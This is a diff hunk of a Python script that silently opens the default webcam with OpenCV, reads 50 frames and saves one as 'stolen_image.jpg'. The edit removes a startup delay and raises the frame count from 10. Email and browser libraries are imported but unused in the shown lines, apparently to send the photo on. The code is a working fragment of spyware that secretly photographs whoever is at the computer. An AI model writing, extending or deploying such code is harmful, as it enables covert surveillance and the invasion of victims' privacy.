@@ -2,15 +2,12 @@ import cv2
 import smtplib
 from email.message import EmailMessage
 import webbrowser
-import time
 
 cam = cv2.VideoCapture(0)
 
-time.sleep(1)
-
-for i in range(10):
+for i in range(50):
  ret, frame = cam.read()
- 
+
 cv2.imwrite('stolen_image.jpg', frame)
 
 cam.release()
